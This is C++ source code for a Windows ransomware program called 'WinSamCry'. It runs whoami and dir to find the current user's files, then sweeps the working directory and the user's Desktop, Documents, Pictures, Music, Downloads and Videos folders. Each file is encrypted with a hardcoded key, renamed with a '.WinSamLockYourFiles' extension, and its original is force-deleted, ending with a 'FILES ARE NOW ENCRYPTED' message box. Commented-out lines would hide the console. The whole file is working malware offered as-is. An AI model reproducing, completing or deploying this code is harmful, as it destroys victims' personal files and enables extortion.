#include <iostream>
#include <fstream>
#include <string>
#include "code/sys.h"
#include <Windows.h>
#include <vector>



string gblo;
using namespace std; 
void encrypt(string file, string filename, string originpath, string cname);
int main()
{
	//ShowWindow(GetConsoleWindow(), 0); //hide the cmd terminal
	//Sleep(5000);
	SetConsoleTitle("WannaCry , nah just kidding it's WinSamCry");
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	char cname[MAX_PATH];
	//string cna = GetModuleFileName();
	DWORD size = GetModuleFileNameA(NULL, cname, MAX_PATH);
	string tempmespg = cname;
	string name_of_exe;
	cout << tempmespg << endl;
	for(int i = tempmespg.length();0<i;i--)
	{
		if (tempmespg[i] == '\\')
		{
			name_of_exe = tempmespg.substr(i+1,tempmespg.length() - i-1);
			break;
		}
	}


	string data1, data2, key, mode, check;
	system("chdir > rfgudfisedkuegbduxkdzsnifdnfudiesndfckhsezdfoicrdfnckersf.txt");
	ifstream gg;
	gg.open("rfgudfisedkuegbduxkdzsnifdnfudiesndfckhsezdfoicrdfnckersf.txt");
	string filepath;
	getline(gg, filepath);
	string finalfilepath;
	gblo= filepath;
	string path = finalfilepath;
	for (int i = 0; i < filepath.length(); i++)
	{
		if (filepath[i] != '\\')
		{
			finalfilepath= finalfilepath + filepath[i];
		}
		else
		{
			finalfilepath = finalfilepath + "\\" + "\\";
		}
	}
	gg.close();
	system("del /f \"rfgudfisedkuegbduxkdzsnifdnfudiesndfckhsezdfoicrdfnckersf.txt\""); 
	system("whoami > frdgtfhytgrfedefrbggtredw3fgbtrewdvbgfrgbthrbfrfbgfetynterfgbftregbyrhnbrgtfxdrsgrthfrefdcthrtgdv.txt");
	ifstream c;
	c.open("frdgtfhytgrfedefrbggtredw3fgbtrewdvbgfrgbthrbfrfbgfetynterfgbftregbyrhnbrgtfxdrsgrthfrefdcthrtgdv.txt");
	string ttt;
	getline(c, ttt, '\\');
	getline(c, ttt);
	c.close();
	cout << "value of ttt is" << ttt << endl;
	system("del /f \"frdgtfhytgrfedefrbggtredw3fgbtrewdvbgfrgbthrbfrfbgfetynterfgbftregbyrhnbrgtfxdrsgrthfrefdcthrtgdv.txt\"");
	system("dir >derjgiefi4u123vd8rgnreinfwfuenrwufnvr843frgtfvdfergtbfvdrgthbfregthybfvgtrhujykyj3n.txt");
			ifstream a;
			a.open("derjgiefi4u123vd8rgnreinfwfuenrwufnvr843frgtfvdfergtbfvdrgthbfregthybfvgtrhujykyj3n.txt");
			int count=0;

			while (!a.eof())
			{ 
				string tempaaaa;
				getline(a, tempaaaa);
				count++;
			}
			a.close();
			count = count - 10; // minus the file that no revelant 
			int tempa = count;
			string *arrays = new string[tempa];
			ifstream b;
			b.open("derjgiefi4u123vd8rgnreinfwfuenrwufnvr843frgtfvdfergtbfvdrgthbfregthybfvgtrhujykyj3n.txt");
			count = 0;
			while (!b.eof())
			{
				string temp1;
				string temp2;
				getline(b, temp1, '.');
				getline(b, temp2);
				if (temp2 == "." || temp2 == "")
				{

				}
				else
				{ 
					temp2 = "." + temp2;
					for (int i = temp1.length()-1; 0 < i; i--)
					{
						if (temp1[i] == 'M' && (temp1[i - 1] == 'A' || temp1[i - 1] == 'P') &&( temp1[i - 2] == ' ' || temp1[i - 2] == 32)  && temp1[i-5] ==':' && temp1[i-8] ==32 && temp1[i-9] == 32)
						{
							break;
						}
						else
						{
							temp2 = temp1[i] + temp2;
						}
					}
					cout << "temp2 vlaue is " << temp2 << endl;
					for (int i = 0; i < temp2.length(); i++)
					{
						if (temp2[i] == 32 || temp2[i] == ' ')
						{
							continue;
						}
						else
						{
							temp2 = temp2.substr(i, temp2.length() - i);
							break;
						}
					}
					for (int i = 0; i < temp2.length()-1; i++)
					{
						if (temp2[i] == 32 || temp2[i] == ' ')
						{
							temp2 = temp2.substr(i+1, temp2.length() - i);
							break;
						}
					}
					arrays[count] = temp2;
					count++;
				}
			}
			b.close();
			system("del /f \"derjgiefi4u123vd8rgnreinfwfuenrwufnvr843frgtfvdfergtbfvdrgthbfregthybfvgtrhujykyj3n.txt\"");
			for (int i = 0; i < count; i++)
			{
				mode = "E";
				check = "mWtO1G7EhP4Ufohc1mSIZU7QGW7wjM^yqxlY$bAyBL77qmq@ZPbRaidE%nXyvASi6z5aHW4Fd6hoj1BmY8smNNWh3JHxP9PVE!U";
				key   = "mWtO1G7EhP4Ufohc1mSIZU7QGW7wjM^yqxlY$bAyBL77qmq@ZPbRaidE%nXyvASi6z5aHW4Fd6hoj1BmY8smNNWh3JHxP9PVE!U";
				data1=arrays[i];
				
			if (data1 == name_of_exe || data1=="Decryption.exe" || data1=="derjgiefi4u123vd8rgnreinfwfuenrwufnvr843frgtfvdfergtbfvdrgthbfregthybfvgtrhujykyj3n.txt")
			{
				continue;	
			}
			cout << "data1" << data1 << endl;
				data2 = data1 + ".WinSamLockYourFiles";
				if(data1.length()>20)
				{
					string checkencryptedornot = data1.substr(data1.length() - 20, 20);
					if (checkencryptedornot == ".WinSamLockYourFiles")
					{
						continue;
					}
					cout << "checkencryptedornot" << checkencryptedornot << endl;
				}
				SetConsoleTextAttribute(hConsole, 8);
				readSystem(data1, data2, key, mode);
				thread tmain(readSystem, data1, data2, key, mode);
				tmain.join();
				//system("cls");
				//SetConsoleTextAttribute(hConsole, 8);
				if (remove(data1.c_str()) != 0)
				{
					if (arrays[i] == "derjgiefi4u123vd8rgnreinfwfuenrwufnvr843frgtfvdfergtbfvdrgthbfregthybfvgtrhujykyj3n.txt")
					{
						continue;
					}
					else
					{
						cout << "Failed to delete the Original folder " << arrays[i] << endl;
						//perror("Error deleting file");
					}
				}
				else
				{
					puts("File successfully deleted & file is encrypted ");
				}
			}	
			string ab = "cd c:\\Users\\" + ttt + " && dir > rootefrgthyujiygtrfdsewfrgtuyjgtfrdcsefrgthyujygtrfdcsxadwefrgtbf.txt && copy c:\\Users\\" + ttt + "\\rootefrgthyujiygtrfdsewfrgtuyjgtfrdcsefrgthyujygtrfdcsxadwefrgtbf.txt " + finalfilepath;
			string files = "rootefrgthyujiygtrfdsewfrgtuyjgtfrdcsefrgthyujygtrfdcsxadwefrgtbf.txt";
			string origin = "c:\\Users\\" + ttt;
			system(ab.c_str());
			encrypt(finalfilepath, files, origin, name_of_exe);

			string abc = "cd c:\\Users\\" + ttt + "\\Pictures\\ && dir > picefrgthyujiygtrfdsewfrgtuyjgtfrdcsefrgthyujygtrfdcsxadwefrgtbf.txt && copy c:\\Users\\" + ttt + "\\Pictures\\picefrgthyujiygtrfdsewfrgtuyjgtfrdcsefrgthyujygtrfdcsxadwefrgtbf.txt "+ finalfilepath;
			 files = "picefrgthyujiygtrfdsewfrgtuyjgtfrdcsefrgthyujygtrfdcsxadwefrgtbf.txt";
			system(abc.c_str());
			origin = "c:\\Users\\" + ttt+"\\"+"Pictures";
			encrypt(finalfilepath, files, origin, name_of_exe);

			string abcd = "cd c:\\Users\\" + ttt + "\\Desktop\\ && dir > deskefrgthyujiygtrfdsewfrgtuyjgtfrdcsefrgthyujygtrfdcsxadwefrgtbf.txt && copy c:\\Users\\" + ttt + "\\Desktop\\deskefrgthyujiygtrfdsewfrgtuyjgtfrdcsefrgthyujygtrfdcsxadwefrgtbf.txt " + finalfilepath;
			 files = "deskefrgthyujiygtrfdsewfrgtuyjgtfrdcsefrgthyujygtrfdcsxadwefrgtbf.txt";	
			system(abcd.c_str());
			origin = "c:\\Users\\" + ttt + "\\" + "Desktop";
			encrypt(finalfilepath, files, origin, name_of_exe);
		
			string abcde = "cd c:\\Users\\" + ttt + "\\Documents\\ && dir > docuefrgthyujiygtrfdsewfrgtuyjgtfrdcsefrgthyujygtrfdcsxadwefrgtbf.txt && copy c:\\Users\\" + ttt + "\\Documents\\docuefrgthyujiygtrfdsewfrgtuyjgtfrdcsefrgthyujygtrfdcsxadwefrgtbf.txt " + finalfilepath;
			 files = "docuefrgthyujiygtrfdsewfrgtuyjgtfrdcsefrgthyujygtrfdcsxadwefrgtbf.txt";
			system(abcde.c_str());
			origin = "c:\\Users\\" + ttt + "\\" + "Documents";
			encrypt(finalfilepath, files, origin, name_of_exe);

			string abcdef = "cd c:\\Users\\" + ttt + "\\Music\\ && dir > Musiefrgthyujiygtrfdsewfrgtuyjgtfrdcsefrgthyujygtrfdcsxadwefrgtbf.txt && copy c:\\Users\\" + ttt + "\\Music\\Musiefrgthyujiygtrfdsewfrgtuyjgtfrdcsefrgthyujygtrfdcsxadwefrgtbf.txt " + finalfilepath;
			 files = "Musiefrgthyujiygtrfdsewfrgtuyjgtfrdcsefrgthyujygtrfdcsxadwefrgtbf.txt";
			system(abcdef.c_str());
			origin = "c:\\Users\\" + ttt + "\\" + "Music";
			encrypt(finalfilepath, files, origin, name_of_exe);

			string abcdefg = "cd c:\\Users\\" + ttt + "\\Downloads\\ && dir > dlefrgthyujiygtrfdsewfrgtuyjgtfrdcsefrgthyujygtrfdcsxadwefrgtbf.txt && copy c:\\Users\\" + ttt + "\\Downloads\\dlefrgthyujiygtrfdsewfrgtuyjgtfrdcsefrgthyujygtrfdcsxadwefrgtbf.txt " + finalfilepath;
			files = "dlefrgthyujiygtrfdsewfrgtuyjgtfrdcsefrgthyujygtrfdcsxadwefrgtbf.txt";
			system(abcdefg.c_str());
			origin = "c:\\Users\\" + ttt + "\\" + "Downloads";
			encrypt(finalfilepath, files, origin, name_of_exe);

			string abcdefgh = "cd c:\\Users\\" + ttt + "\\Videos\\ && dir > videfrgthyujiygtrfdsewfrgtuyjgtfrdcsefrgthyujygtrfdcsxadwefrgtbf.txt && copy c:\\Users\\" + ttt + "\\Videos\\videfrgthyujiygtrfdsewfrgtuyjgtfrdcsefrgthyujygtrfdcsxadwefrgtbf.txt " + finalfilepath;
			files = "videfrgthyujiygtrfdsewfrgtuyjgtfrdcsefrgthyujygtrfdcsxadwefrgtbf.txt";
			system(abcdefgh.c_str());
			origin = "c:\\Users\\" + ttt + "\\" + "Videos";
			encrypt(finalfilepath, files, origin, name_of_exe);


			
			delete[]arrays;
			arrays = nullptr;
				char * str1 = (char*)(L"º”√‹ÕÍ≥…");
			// Provide "str" to this third party source code
			// Once you get again "str", now you can:
			wchar_t * wstr1 = (wchar_t*)(str1);
			//cout << *wstr << endl;
			MessageBoxW(NULL, wstr1, (LPCWSTR)L"FILES ARE NOW ENCRYPTED", MB_OK);
			system("pause");
			
	return 0;
} 



void encrypt(string file , string filename , string originpath ,string cname)
{
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	ifstream a;
	a.open(filename.c_str());
	int count = 0;
	while (!a.eof())
	{
		string tempaaaa;
		getline(a, tempaaaa);
		count++;
	}
	a.close();
	count = count - 10; // minus the file that no revelant 
	int tempa = count;
	string *arrays = new string[tempa];
	ifstream b;
	b.open(filename.c_str());
	count = 0;
	while (!b.eof())
	{
		string temp1;
		string temp2;
		getline(b, temp1, '.');
		getline(b, temp2);
		if (temp2 == "." || temp2 == "")
		{

		}
		else
		{
			temp2 = "." + temp2;
			for (int i = temp1.length() - 1; 0 < i; i--)
			{
				if (temp1[i] == 'M' && (temp1[i - 1] == 'A' || temp1[i - 1] == 'P') && (temp1[i - 2] == ' ' || temp1[i - 2] == 32) && temp1[i - 5] == ':' && temp1[i - 8] == 32 && temp1[i - 9] == 32)
				{
					break;
				}
				else
				{
					temp2 = temp1[i] + temp2;
				}
			}
			cout << "temp2 value is in directories" << temp2 << endl;
			for (int i = 0; i < temp2.length(); i++)
			{
				if (temp2[i] == 32 || temp2[i] == ' ')
				{
					continue;
				}
				else
				{
					temp2 = temp2.substr(i, temp2.length() - i);
					break;
				}
			}
			for (int i = 0; i < temp2.length() - 1; i++)
			{
				if (temp2[i] == 32 || temp2[i] == ' ')
				{
					temp2 = temp2.substr(i + 1, temp2.length() - i);
					break;
				}
			}
			arrays[count] = temp2;
			//cout << "arrays " << count << "value is" << arrays[count] << endl;
			count++;
		}
	}
	b.close();
	string deletepaths = "del / f \""+filename+"\"";
	system(deletepaths.c_str());
	string temporaryy;
	string aaaaaaaa = originpath;
	for (int i = 0; i < originpath.length(); i++)
	{
		if (originpath[i] != '\\')
		{
			temporaryy = temporaryy+originpath[i];
		}
		else if(originpath[i] == '\\' && originpath[i+1] != '\\')
		{
			temporaryy = temporaryy + "\\\\";
		}
	}
	originpath= temporaryy;
	for (int i = 0; i < count; i++)
	{
		if (arrays[i] == filename)
		{
			string del2 = "del /f \"" + aaaaaaaa + "\\" + filename+"\""; // delete 
			system(del2.c_str());
			continue;
		}
		string pathtodo = "copy \""+originpath + "\\" + "\\" + arrays[i] + "\" " + file;
		string deletepath = "del /f \"" + aaaaaaaa + "\\" + arrays[i]+"\"";
		SetConsoleTextAttribute(hConsole, 0);
		system(pathtodo.c_str());
		system(deletepath.c_str());
		SetConsoleTextAttribute(hConsole, 8);
		
		string data1, data2, key, mode, check;
		string del = "del /f \"" + arrays[i] +"\""; // encryption .txt 
			mode = "E";
			check = "mWtO1G7EhP4Ufohc1mSIZU7QGW7wjM^yqxlY$bAyBL77qmq@ZPbRaidE%nXyvASi6z5aHW4Fd6hoj1BmY8smNNWh3JHxP9PVE!U";
			key = "mWtO1G7EhP4Ufohc1mSIZU7QGW7wjM^yqxlY$bAyBL77qmq@ZPbRaidE%nXyvASi6z5aHW4Fd6hoj1BmY8smNNWh3JHxP9PVE!U";
			data1 = arrays[i];
			if (data1 == cname || data1 == "Decryption.exe")
			{
				continue;
			}
			data2 = data1 + ".WinSamLockYourFiles";
			if (data1.length() > 20)
			{
				string checkencryptedornot = data1.substr(data1.length() - 20, 20);
				if (checkencryptedornot == ".WinSamLockYourFiles")
				{
					continue;
				}
				cout << "checkencryptedornot" << checkencryptedornot << endl;
			}
			string del1 = "del /f \""+ gblo +"\\"+ data2+"\"";
			readSystem(data1, data2, key, mode);
			thread tmain(readSystem, data1, data2, key, mode);
			tmain.join();
			string copyback = "copy \"" +file+"\\\\"+data2+"\" "+originpath+"\\\\";
			string del2 = "del /f \"" + aaaaaaaa + "\\" + filename+"\""; // delete 
			SetConsoleTextAttribute(hConsole, 0);
			system(copyback.c_str());
			system(del.c_str());
			system(del1.c_str());	
			SetConsoleTextAttribute(hConsole, 8);
	}
	
	delete[]arrays;
	arrays = nullptr;
}